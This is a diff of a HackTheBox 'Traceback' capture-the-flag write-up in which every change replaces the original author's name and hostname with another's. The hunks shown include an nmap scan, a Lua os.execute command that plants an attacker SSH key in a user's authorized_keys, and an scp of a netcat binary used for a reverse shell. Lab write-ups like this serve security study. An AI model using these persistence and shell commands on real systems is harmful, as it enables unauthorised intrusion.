@@ -1,6 +1,6 @@
 ---
 title: Hackthebox - Traceback
-author: Corshine
+author: Rhovelionz
 date: 2020-08-14 22:21:00 +0700
 categories: [Hackthebox]
 tags: [Lua, Php, Webshell, Ssh, Update-motd.d]
@@ -31,7 +31,7 @@ image: /assets/img/Post/Traceback.jpeg
 ***
 
 ```
-root@lordcorshine:~/htb/traceback# nmap -sCV -T4 -oA nmap/output traceback.htb
+root@lordrhovelionz:~/htb/traceback# nmap -sCV -T4 -oA nmap/output traceback.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-12 10:21 WIB
 Nmap scan report for traceback.htb (10.10.10.181)
 Host is up (0.12s latency).
@@ -49,7 +49,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds
-root@lordcorshine:~/htb/traceback# 
+root@lordrhovelionz:~/htb/traceback# 
 ```
 
 ## **<span style='color:#ff5555'>Port 80</span>**
@@ -149,7 +149,7 @@ I decided to execute the `luvit`, it's a `lua` programming language, and send my
 ```
 webadmin@traceback:/home$ sudo -u sysadmin /home/sysadmin/luvit
 Welcome to the Luvit repl!
-> os.execute("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDABGR3pWiG1Wz4cE6+XldqXF4yOrqCmbquMv5DvysjYGqUCMbdmr8Gql1gVn3mfiC1jVFWiCkq1BaweneadhLj4DhaJ/hsuSpNN29Pm11UdhrBbfnIJnl9BYb3Z42lt3dAIjPW9EhHc4d+rIrXnPQxuSVx9pV+cj3QhVBQQ9y78fbSXW/82fBLbGgGsmh5jAHE8ZUlMi6xhXMVsDJy3sYkWRPzAaX+/GxqIXGu6JgmZlqtR1QwUYTYhvwQa7Hs+Xj53ayt/YKhl9LCh9xFUwH6YqEnU12+0uEtOn/15y6xfBs4JuRRo05BvOxyLk5PfAHlt/GCk3COWXXoTfrrWEv0hDFR5sSel9xRIoAWXqAYkU2C543NSHu1HrJB3i0L960Ib1DW+WcXvuH9qNZeGpdX1vljTYbKgU1dViu3ACim5YhlQI5sWWe8NH+RqoLuUIQOBhJsXwvK3kZMBOZY8kpUipgMEYm1oyUTbX8wfx1Fj/IByXwO2BLYSlNG+ym8DZc= root@lordcorshine' >> /home/sysadmin/.ssh/author
+> os.execute("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDABGR3pWiG1Wz4cE6+XldqXF4yOrqCmbquMv5DvysjYGqUCMbdmr8Gql1gVn3mfiC1jVFWiCkq1BaweneadhLj4DhaJ/hsuSpNN29Pm11UdhrBbfnIJnl9BYb3Z42lt3dAIjPW9EhHc4d+rIrXnPQxuSVx9pV+cj3QhVBQQ9y78fbSXW/82fBLbGgGsmh5jAHE8ZUlMi6xhXMVsDJy3sYkWRPzAaX+/GxqIXGu6JgmZlqtR1QwUYTYhvwQa7Hs+Xj53ayt/YKhl9LCh9xFUwH6YqEnU12+0uEtOn/15y6xfBs4JuRRo05BvOxyLk5PfAHlt/GCk3COWXXoTfrrWEv0hDFR5sSel9xRIoAWXqAYkU2C543NSHu1HrJB3i0L960Ib1DW+WcXvuH9qNZeGpdX1vljTYbKgU1dViu3ACim5YhlQI5sWWe8NH+RqoLuUIQOBhJsXwvK3kZMBOZY8kpUipgMEYm1oyUTbX8wfx1Fj/IByXwO2BLYSlNG+ym8DZc= root@lordrhovelionz' >> /home/sysadmin/.ssh/author
 ized_keys")
 true    'exit'  0
 > 
@@ -208,7 +208,7 @@ And this is the **file** that I put my **reverse shell** which will give me **ro
 Send **nc** to the **sysadmin** on `/tmp` directory with **scp**.
 
 ```
-root@lordcorshine:~/htb/traceback# l
+root@lordrhovelionz:~/htb/traceback# l
 total 56K
 drwxr-xr-x 5 root root 4.0K Aug 12 11:18 .
 drwxr-xr-x 6 root root 4.0K Aug 12 10:08 ..
@@ -216,7 +216,7 @@ drwxr-xr-x 2 root root 4.0K Aug 12 10:19 exploit
 -rwxr-xr-x 1 root root  35K Aug 12 11:18 nc
 drwxr-xr-x 2 root root 4.0K Aug 12 10:20 nmap
 drwxr-xr-x 3 root root 4.0K Aug 12 11:07 Web-Shells
-root@lordcorshine:~/htb/traceback# scp -i ~/.ssh/id_rsa nc sysadmin@traceback.htb:/tmp
+root@lordrhovelionz:~/htb/traceback# scp -i ~/.ssh/id_rsa nc sysadmin@traceback.htb:/tmp
 ################################
 -------- OWNED BY XH4H  ---------
 - I guess stuff could have been configured better ^^ -
